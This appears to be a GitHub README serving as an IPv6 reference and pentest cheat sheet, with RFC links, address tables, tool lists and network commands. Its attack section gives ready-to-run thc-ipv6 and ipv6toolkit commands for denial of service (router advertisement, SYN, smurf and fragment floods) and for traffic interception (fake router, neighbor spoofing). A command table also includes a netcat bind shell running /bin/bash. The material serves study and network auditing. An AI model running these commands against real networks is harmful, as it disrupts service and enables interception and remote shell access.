# IPv6
> Playing with IPv6 for fun and profit<br />
> Inspired by [@FernandoGont](https://twitter.com/FernandoGont), [@fegoffinet](https://twitter.com/fegoffinet) and [@bortzmeyer](https://twitter.com/bortzmeyer)<br />
> I have also passed the IPv6 Hurrican Electric Certifications with the sage level, it was very fun and educational, I recommend it : https://ipv6.he.net/certification/


* [RFCs](https://github.com/zbetcheckin/IPv6/blob/master/README.md#rfcs)<br />
* [IPv4/IPv6 Comparison](https://github.com/zbetcheckin/IPv6/blob/master/README.md#ipv4ipv6-comparison)<br />
* [IPv6 Specifications](https://github.com/zbetcheckin/IPv6/blob/master/README.md#ipv6-specifications)<br />
* [IPv6 Certifications](https://github.com/zbetcheckin/IPv6/blob/master/README.md#ipv6-certifications-mortar_board)<br />
* [Cheat sheets](https://github.com/zbetcheckin/IPv6/blob/master/README.md#cheat-sheets)<br />
* [Tools](https://github.com/zbetcheckin/IPv6/blob/master/README.md#tools-wrench)<br />
* [IPv6 basic network commands](https://github.com/zbetcheckin/IPv6/blob/master/README.md#ipv6-basic-network-commands)<br />
* [IPv6 network discovery](https://github.com/zbetcheckin/IPv6/blob/master/README.md#ipv6-network-discovery)<br />
* [DNS - AS](https://github.com/zbetcheckin/IPv6/blob/master/README.md#dns---as)<br />
* [Internet access test](https://github.com/zbetcheckin/IPv6/blob/master/README.md#internet-access-test-construction_worker)<br />
* [Search for IPv6 addresses & domains](https://github.com/zbetcheckin/IPv6/blob/master/README.md#search-for-ipv6-addresses--domains-dart)<br />
* [Investigation on IPv6 addresses & domains](https://github.com/zbetcheckin/IPv6/blob/master/README.md#investigation-on-ipv6-addresses--domains-mag)<br />
* [Scapy](https://github.com/zbetcheckin/IPv6/blob/master/README.md#scapy)<br />
* [IPv6 hosting](https://github.com/zbetcheckin/IPv6/blob/master/README.md#ipv6-hosting-office)<br />
* [Misc](https://github.com/zbetcheckin/IPv6/blob/master/README.md#misc)<br />
* [Vulnerabilities and attacks](https://github.com/zbetcheckin/IPv6/blob/master/README.md#vulnerabilities-and-attacks-unlock)<br />
* [Statistics](https://github.com/zbetcheckin/IPv6/blob/master/README.md#statistics-chart_with_upwards_trend)<br />
* [Sources](https://github.com/zbetcheckin/IPv6/blob/master/README.md#sources-information_source)<br />


## RFCs
Name | URL 
------------------------------------ | ---------------------------------------------
Internet Protocol Version 6 | https://www.rfc-editor.org/rfc/rfc2460.txt
IPv6 Addressing Architecture | https://www.rfc-editor.org/rfc/rfc4291.txt
Neighbor Discovery for IPv6 | https://www.rfc-editor.org/rfc/rfc4861.txt
Rogue IPv6 Router Advertisement | https://www.rfc-editor.org/rfc/rfc6104.txt
Neighbor Discovery Problems | https://www.rfc-editor.org/rfc/rfc6583.txt
Network Reconnaissance in IPv6 | https://www.rfc-editor.org/rfc/rfc7707.txt
RFCs related to IPv6 | http://ipv6now.com.au/RFC.php


## IPv4/IPv6 Comparison
Setting | IPv4 | IPv6
------------------------------------ |------------------------------------ | ---------------------------------------------
Address | 32 bits | 128 bits
Neighbor Discovery | ARP | NDP, ICMPv6
Auto configuration |  ICMP & DHCP | ICMPv6 & DHCPv6 (optional) 
Packet transmition | Broadcast / Multicast | Multicast
ICMP | ICMPv4 | ICMPv6
Fragmentation | Both in hosts and routers | Only in hosts
Local network | 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 | ULA fc00::/7, fd00::/8
Headers Comparison 1 | Options | Extensions
Headers Comparison 2 | Next Header | Protocol
Headers Comparison 3 | Hop Limit | Time to Live
Loopback address | 127.0.0.1 | ::1


## IPv6 Specifications
Address type | Binary prefix | IPv6 notation
------------------------------------ |------------------------------------ | ---------------------------------------------
Unspecified | 00...0 (128 bits) | ::/128
Loopback | 00...1 (128 bits) | ::1/128
Multicast | 11111111 | ff00::/8
Link-local unicast | 1111111010 | fe80::/64
Site-local unicast | 1111111011 | fec0::/10
Global unicast | everything else | everything else
Unique local address (ULA) | 1111 110L | FC00::7 

* Each computer get a public IP
* Local automatic addressing
* Global Autoconfiguration and/or DHCPv6
* No more need of "NAT"
* No more "Header Checksum" IHL fields
* Fragmentation function removed from routers
* DHCPv6-PD, IPAM solutions
* "Flow Label" is new : Used by a source to label sequences of packets for which it
requests special handling by the IPv6 routers


#### Subnet calculator
Name | URL 
------------------------------------ | ---------------------------------------------
Subnetonline | http://www.subnetonline.com/pages/subnet-calculators.php
Subnet Calculator in Python | https://github.com/aipi/IPv6-subnet-calculator

## IPv6 Certifications :mortar_board:
Name | URL 
------------------------------------ | ---------------------------------------------
Hurricane Electric | https://ipv6.he.net/certification/
NIC.br (PT-BR) | http://saladeaula.nic.br/courses/course-v1:NIC.br+IPV6-001+T001/about
IPv6 Laboratory (PT-BR) | http://ipv6.br/pagina/livro-ipv6/


## Cheat sheets
[Cheat sheet estoile](https://github.com/zbetcheckin/IPv6/blob/master/cheat_sheet_estoile.pdf)<br />
[Cheat sheet roesen](https://github.com/zbetcheckin/IPv6/blob/master/cheat_sheet_roesen.pdf)<br />


## Tools :wrench:
Name | URL 
------------------------------------ | ---------------------------------------------
thc-ipv6 | https://github.com/vanhauser-thc/thc-ipv6 :+1:
ipv6-toolkit | https://github.com/fgont/ipv6toolkit :+1:
Scapy | http://www.secdev.org/projects/scapy/
Chiron | http://www.secfu.net/tools-scripts/
Scanners | Nmap / Metasploit / Scan6 / Halfscan6
Evil foca | http://www.informatica64.com/
Firewall tester | https://github.com/timsgit/ipscan
Scan detective | https://github.com/regulatre/ipv6-scan-detective
Rogue IPv6 router detector | https://github.com/xme/rrhunter
Neighbor discovery protocol monitor | https://packages.debian.org/jessie/ndpmon
Netcat6 | https://packages.debian.org/source/jessie/amd64/nc6
Diagnostic tools | https://packages.debian.org/jessie/ndisc6
IPv6 addresses calculator | https://packages.debian.org/jessie/ipv6calc
Online scanner | http://www.ipv6scanner.com/
Online scanner | http://www.subnetonline.com/pages/ipv6-network-tools/online-ipv6-port-scanner.php
Online utilities | https://centralops.net/


## IPv6 basic network commands
Action | Command
------------------------------------ | ---------------------------------------------
Address ping | `$ ping6 -I eth0 IPv6ADDR`
Connections | `$ netstat -A inet6`
Determining address type | `$ addr6 -a IPv6ADDR`
Display neighbor cache | `$ ip -6 neigh show`
DNS lookup | `$ host DOMAIN`
Domain ping | `$ ping6 -I eth0 DOMAIN`
Flush neighbor cache | `$ ip -6 neigh flush`
Identifying the Flow ID generation policy | `$ sudo ./flow6 -i eth0 -v --flow-label-policy -d IPv6ADDR`
IP show | `$ ip -6 addr` or `$ sudo ifconfig | grep inet6`
IPtables | `$ sudo ip6tables -L -v --line-numbers`
NETCAT | Listen `$ nc6 -lp 12345 -v -e "/bin/bash"` & Connect `$ nc6 localhost 12345`
Numerical address in URL needs brackets | `http://[IPv6]/` or with a port `http://[IPv6]/:80`
Routes | `$ ip -6 route` or `$ netstat -rnA inet6` or `$ sudo route -A inet6`
SSH | `$ ssh -6 user@IPv6ADDR%eth0`
TCPDUMP | `$ sudo tcpdump -i eth0 -evv ip6 or proto ipv6`
TELNET | `$ telnet IPv6ADDR PORT`
Traceroute | `$ traceroute6 DOMAIN`
Traceroute EH-enabled | `$ sudo ./path6 -v -u 72 -d DOMAIN`
Traceroute with MTR | `$ mtr -6 DOMAIN`
Trace the path to discover the MTU | `$ tracepath6 DOMAIN`


## IPv6 network discovery
Action | Command
------------------------------------ | ---------------------------------------------
Listening for neighbor solitication passively | `$ sudo ./passive_discovery6 eth0`
Duplicate Address Detection | `$ sudo ./detect-new-ip6 eth0`
ICMPv6 Router Discovery | `$ rdisc6 eth0` :+1:
Local scan | `$ sudo ./scan6 -i eth0 --local-scan --rand-src-addr --verbose` # Link-local & Global addresses :+1:
Send ICMPv6 echo-request | `$ ping6 ff02::1%eth0` (all nodes address - RFC4291) :+1:
Send ICMPv6 echo-request | `$ ping6 ff02::2%eth0` (all routers address - RFC4291) :+1:
Find activities on local network | `$ sudo ./alive6 eth0 -v` # Detect ICMPv6 echo-reply on global addresses
Discover global & MAC addresses | `$ sudo ./scan6 -i eth0 -L -e --print-type global`
Get IPv6 from a MAC addresses | `$ sudo ./inverse_lookup6 eth0 MACADDR`


Action | Command
------------------------------------ | ---------------------------------------------
Nmap scan  | `$ nmap -6 -sT DOMAIN` # `::1` for localhost
Domain scanning | `$ sudo ./scan6 -v -i eth0 -­d DOMAIN/64`
Address scanning | `$ sudo ./scan6 -v -i eth0 -­d IPv6ADDR/64`
Metasploit | `msf > search type:auxiliary ipv6`


## DNS - AS
Action | Command
------------------------------------ | ---------------------------------------------
DNS lookup | `$ nslookup -query=AAAA DOMAIN`
DNS lookup | `$ host -t AAAA DOMAIN`
DNS lookup | `$ dig -6 AAAA DOMAIN`
Reverse lookup | `$ dig -x IPv6ADDR`
DNS enumeration | `$ ./dnsdict6 -d DOMAIN` :+1:
DNS enumeration (PTR request) | `$ ./dnsrevenum6 DNSSERVER IPv6ADDR/64`
DNS lookup with a domain list | `$ cat domainsList.txt | sudo script6 get-aaaa` (Didn't succeed to get script6 working in my test)
DNS enumeration | `$ sudo script6 get-bruteforce-aaaa DOMAIN`
AS-related info | `$ sudo script6 get­-as IPv6ADDR`
AS-related info | `$ sudo script6 get­-asn IPv6ADDR`
Google DNS | IPv4 : 8.8.4.4, 8.8.8.8<br /> IPv6 : 2001:4860:4860::8888, 2001:4860:4860::8844
IPv6 rDNS Nameservers | http://bgp.he.net/ipv6-progress-report.cgi?section=ipv6_rdns


## Internet access test :construction_worker:

#### Using ping
GNU/Linux
```
$ ping6 ipv6.google.com
```
Windows:
```
C:\Users\test>ping ipv6.google.com
```

#### Using traceroute
GNU/Linux
```
$ traceroute6 ipv6.google.com
```

#### Using a browser
Name | URL 
------------------------------------ | ---------------------------------------------
Kame | http://www.kame.net/ :+1: Dance with the :turtle: 
Google test | https://ipv6test.google.com/
ipv6now | http://ipv6now.com.au/tools.php
ipv6-test | http://ipv6-test.com/
test-ipv6 | http://test-ipv6.com/
testmyipv6 | http://v6.testmyipv6.com/
whatismyv6 | http://whatismyv6.com/
webdnstools | http://www.webdnstools.com/dnstools/dns-lookup-ipv6
Speed test | http://www.speedtest6.com/
Speed test | http://ipv6-speedtest.net/
Firewall tester | http://www6.chappell-family.co.uk/ (https://github.com/timsgit/ipscan)
Hurricane Electric | https://ipv6.he.net/certification/


## Search for IPv6 addresses & domains :dart:
Name | URL
------------------------------------ | ---------------------------------------------
BGP Toolkit | http://bgp.he.net/ :+1:
BGP IPv6 progress report | http://bgp.he.net/ipv6-progress-report.cgi
DNS | A domain analysis could reveal IPv6 addresses (AAAA & PTR records)
SSL | An SSL analysis could reveal IPv6 addresses too
IPv4 - IPv6 | Search for dual stacked host
Google dorks | site:ipv6.*
Recent websites validated | http://ipv6-test.com/validate.php
Recent websites added | http://sixy.ch/
Shodan | https://www.shodan.io/
IPv6 map's project | https://mrlooquer.com/
Dual Stack Chart | http://ipv6eyechart.ripe.net/


## Investigation on IPv6 addresses & domains :mag:
Name | URL
------------------------------------ | ---------------------------------------------
BGP Toolkit | http://bgp.he.net/ :+1:
TCP utils | http://www.tcpiputils.com/
Ultra tools | https://www.ultratools.com/tools/asnInfo
IP research | https://whatismyipaddress.com/
Black list | https://mxtoolbox.com/blacklists.aspx
extract_hosts6.sh | https://github.com/vanhauser-thc/thc-ipv6/blob/master/extract_hosts6.sh
extract_networks6.sh | https://github.com/vanhauser-thc/thc-ipv6/blob/master/extract_networks6.sh


#### grep on IPv6
```
... | grep -E --color "(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))"
```

#### Other IPv6 filters # man addr6
`$ cat file.txt | addr6 -i -s`


## Scapy

[@antoniosatlasis](https://twitter.com/antoniosatlasis) did some nice scapy scripts during this workshop (starting on page 184) : <br />
[https://www.ernw.de/download/Advanced Attack Techniques against IPv6 Networks-final.pdf](https://www.ernw.de/download/Advanced%20Attack%20Techniques%20against%20IPv6%20Networks-final.pdf)<br />
To be continued


## IPv6 hosting :office:
Name | URL 
------------------------------------ | ---------------------------------------------
Hosting providers | https://www.sixxs.net/wiki/IPv6_Enabled_Hosting
Hosting providers | http://www.fix6.net/ipv6-webhosting/
VPS | https://www.sixxs.net/wiki/IPv6_Enabled_VPS_Hosting


## Misc
Name | URL
------------------------------------ | ---------------------------------------------
Wireshark | https://wiki.wireshark.org/IPv6
IPv6 attack detector | https://github.com/mzweilin/ipv6-attack-detector/ & https://www.honeynet.org/node/944

## Vulnerabilities and attacks :unlock:

Monitoring new related IPv6 vulnerabilites : https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=ipv6

Most of the following vulnerabilities and attacks come from [@FernandoGont](https://twitter.com/FernandoGont) <br />


### Denial of Services
* Router Advertisement
* Router lifetime 0
* Neighbor Advertisement
* Neighbor Solicitation
* TooBig error messages
* TCP SYN
* Smurf attack
* Fragments management
* DAD (Duplicate Address Detection)
* Buffer / Connections
* Other denial of services


### Audit / Bypass
* Firewall audit & Filter bypass tests
* IPv6 implementation test


### MITM
* Router Advertisement MITM
* Neighbor Solitication Interceptor

### Fragmentations
* Predictable fragment ID identification values
* Atomic fragments
* Fragment reassembly policy
* Fragment firewall and implementation tests


### Others
* Advertise a malicious Current Hop Limit 
* Advertise a malicious MTU
* Disable an Existing Router
* BlackHole


### Denial of Services :trollface:


#### Router Advertisement :+1:
Flood the local network with router advertisements. Many OS do not have an upper limit to the number of network a machine can belong to. All their resources can be consumed trying to join thousands of fake IPv6 networks.<br />
`$ sudo ./flood_router26 eth0`


#### Router lifetime 0
Router Advertisement with Router Lifetime set to 0. It announce to 'ff02:1' that a router is going down 
to delete it from the routing tables. '*' as router-address will sniff the network for RAs and
immediately send a kill packet.<br />
`$ sudo ./kill_router6 eth0 ROUTERADDR`


#### Neighbor Advertisement
Flood the local network with neighbor advertisements. The performance on IPv6 host neighbor tables will degrade and cause a DoS.<br />
`$ sudo ./flood_advertise6 eth0 TARGETIPv6ADDR`<br />
`$ sudo ./na6 -i eth0 --target TARGETIPv6ADDR --dst-address ff02::1 --override -E 1:2:3:4:5:6 --loop --verbose`


#### Neighbor Solicitation :+1:
Flood the network with neighbor solicitations. If no target is supplied, query address will be 'ff02::1'.<br />
`$ sudo ./flood_solicitate6 eth0 TARGETIPv6ADDR`


#### TooBig error messages
Flood the target /64 network with ICMPv6 TooBig error messages.<br />
Perform NDP Exhaustion attacks with ICMPv6 TooBig and EchoRequest (Fortinet & Cisco sensitive from Fernando Gont test)<br />
`$ sudo ./ndpexhaust26 -c -r -p eth0 TARGETIPv6ADDR`


#### TCP SYN
Flood the target with TCP-SYN packets. Destination port can be randomized if you supply "x" as port.<br />
`$ sudo ./thcsyn6 eth0 TARGETIPv6ADDR DSTPORT` # 'thcsyn6 -h' have interesting options <br />
`$ sudo ./tcp6 -i eth0 --src-address SRCIPv6ADDR --dst-address TARGETIPv6ADDR --dst-port DSTPORT --tcp-flags S --flood-sources 100 --loop --sleep 1 --verbose`


#### Smurf attack
Flood the target with network traffic amplification. Send ICMPv6 echo requests to 'FF02::1' with the spoofed source from the attack target.<br />
`$ sudo ./smurf6 eth0 TARGETIPv6ADDR`


#### Fragments management
Flood the reassembly table with imcomplete fragment packets. Only working with poor fragment reassembly queue management.<br />
`$ sudo ./frag6 -i eth0 --flood-frags 10000 --loop --dst-address TARGETIPv6ADDR --verbose`<br />
`$ sudo ./frag6 -i eth0 --flood-frags 100 --loop --src-address ::/0 --dst-address TARGETIPv6ADDR --verbose`



#### DAD (Duplicate Address Detection)
DAD is the mechanism of IPv6 stateless autoconfiguration to detect whether an IPv6 address exists on the network. Every time a new computer asks about IPv6 existence, the attacker replies and claims that he is that IPv6. The new computer cannot join the network since it does not have IPv6 address. It use ICMPv6 neighbor solicitation which sends to all nodes multicast address.<br />
`$ sudo ./na6 -i eth0 --accept-src ::/128 --solicited --override --listen --verbose`<br />
`$ sudo ./dos-new-ip6 eth0`


#### Buffer / Connections
A buffer/connections flood can be done by TCP-SYN with no controlling process and will make a lots of queue data for such connections.<br />
`$ sudo ./tcp6 -i eth0 --dst-address TARGETIPv6ADDR --dst-port 80 --listen --src-address TARGETIPv6ADDR/112 --flood-ports 10 --loop --rate-limit 100pps --data "GET / HTTP/1.0\r\n\r\n" --close-mode LAST-ACK`


#### Other denial of services
The tools 'denial6' allow to performs various denial of services attacks.<br />
`$ sudo ./denial6 eth0 TARGETIPv6ADDR CASENUMBER`<br />
Case number :<br />
1 : large hop-by-hop header with router-alert and filled with unknown options<br />
2 : large destination header filled with unknown options<br />
3 : hop-by-hop header with router alert option plus 180 headers<br />
4 : hop-by-hop header with router alert option plus 178 headers + ping<br />
5 : AH header + ping<br />
6 : first fragments of a ping with a hop-by-hop header with router alert<br />
7 : large hop-by-hop header filled with unknown options (no router alert)<br />


### Audit & Bypass


#### Firewall audit & Filter bypass tests
Performs various access control & bypass attempts to check implementations.<br />
`$ sudo ./firewall6 -H eth0 TARGETIPv6ADDR DSTPORT` # Option '-u' for UDP<br />


#### IPv6 implementation test
Tests various IPv6 specific options for their implementations. It can also be used to test firewalls.<br />
`$ sudo ./implementation6 eth0 TARGETIPv6ADDR`


### MITM


#### Router Advertisement MITM :+1:
Announce yourself as a router and become the default router.<br />
`$ sudo ./fake_router26 eth0` # 'fake_router26 -h' have many interesting options


#### Neighbor Solitication Interceptor
This redirect all local traffic to you by answering falsely to Neighbor Solitication requests.<br />
`$ sudo ./na6 -i eth0 --accept-target TARGETIPv6ADDR --listen -E 11::33:44:55:66 --solicited --override --verbose`<br />
`$ sudo ./parasite6 -l eth0`<br />


### Fragmentations


#### Predictable fragment ID identification values
Predictable Identification values result in an information leakage that can be exploited in a number of ways like to perform a Idle-scan, DoS attacks (fragment ID collisions), uncover the rules of a number of firewalls or count the number of systems behind a middle-box for example.<br />
`$ sudo ./frag6 -i eth0 --frag-id-policy --dst-address TARGETIPv6ADDR --verbose`


#### Atomic fragments
Atomic fragments are IPv6 packets which are not fragmented but still contain a (redundant) Fragment Header. IPv6 packets that contain a Fragment Header with the Fragment Offset set to 0 and the M flag set to 0. If atomic fragments overlap both of the other ones, all of them can be discarded.<br />
`$ sudo ./frag6 -i eth0 --frag-type atomic --frag-id 100 --dst-address TARGETIPv6ADDR --verbose`


#### Fragment reassembly policy
Assess fragment reassembly policy.<br />
`$ sudo ./frag6 -i eth0 -v --frag-reass-policy --dst-address TARGETIPv6ADDR --verbose`


#### Fragment firewall and implementation tests
The tools fragmentation6 can performs a fragment firewall and implementation checks.<br />
`$ sudo ./fragmentation6 eth0 TARGETIPv6ADDR`


### Others


#### Advertise a malicious Current Hop Limit 
Advertise a malicious Current Hop Limit such that packets are discarded by the intervening routers.<br />
`$ sudo ./ra6 -i eth0 --src-address ROUTERADDR --dst-address TARGETIPv6ADDR --curhop HOPS --loop 1 --verbose`


#### Advertise a malicious MTU
Advertise a small Current Hop Limit such that packets are discarded by the intervening routers.<br />
`$ sudo ./ra6 -i eth0 --src-address ROUTERADDR --dst-address TARGETIPv6ADDR -M MTU --loop 1 --verbose`


#### Disable an Existing Router
Impersonate the local router and send a Router Advertisement with a "Router Lifetime" small value. The victim host will remove the router from the 'default routers list'.<br />
`$ sudo ./ra6 -i eth0 --src-address ROUTERADDR --dst-address TARGETIPv6ADDR --lifetime 0 --loop 1 --verbose`


#### BlackHole
Search for a black hole can be useful to find out who is dropping specific packets, network reconnaissance or just checking if you EH-enabled attacks would work.<br />

Tools : blackhole6, scan6<br />

Not tested yet. Related RFC : https://tools.ietf.org/html/rfc6666<br />


TO BE CONTINUED


## Statistics :chart_with_upwards_trend:
Name | URL 
------------------------------------ | ---------------------------------------------
NRO | https://www.nro.net/statistics
Ripe | https://www.ripe.net/publications/ipv6-info-centre
Google | https://www.google.com/intl/en/ipv6/statistics.html
Cisco | http://6lab.cisco.com/stats/
World IPv6 Launch | http://www.worldipv6launch.org/measurements/
M.R.P. | http://www.mrp.net/ipv6_survey/
Top Alexa by country | https://www.vyncke.org/ipv6status/


## Sources :information_source:
* https://www.iana.org/numbers
* https://www.iana.org/assignments/icmpv6-parameters/icmpv6-parameters.xhtml
* https://www.iana.org/assignments/ipv6-unicast-address-assignments/ipv6-unicast-address-assignments.xhtml
* https://www.iana.org/assignments/ipv6-multicast-addresses/ipv6-multicast-addresses.xhtml
* https://www.ripe.net/
* Google dork : "Fernando Gont" IPv6 filetype:pdf
* http://blog.si6networks.com/
* http://void.gr/kargig/ipv6/fgont-hip2012-hacking-ipv6-networks-training.pdf
* http://cisco.goffinet.org/protocole-ipv6 # FR
* http://www.bortzmeyer.org/hacking-ipv6.html # FR
* http://www.bortzmeyer.org/7707.html # FR
* http://wiki.yobi.be/wiki/IPv6
* https://www.sans.org/reading-room/whitepapers/detection/complete-guide-ipv6-attack-defense-33904
* http://www.worldipv6launch.org/
* https://groups.google.com/forum/#!forum/ipv6hackers
* https://netpatterns.blogspot.fr/2016/01/the-rising-sophistication-of-network.html
* https://www.cs.columbia.edu/~smb/papers/v6worms.pdf
* http://www.maths.tcd.ie/~dwmalone/p/addr-pam08.pdf
* https://mschuette.name/files/uni/110901-Diplomarbeit-SnortIPv6.pdf


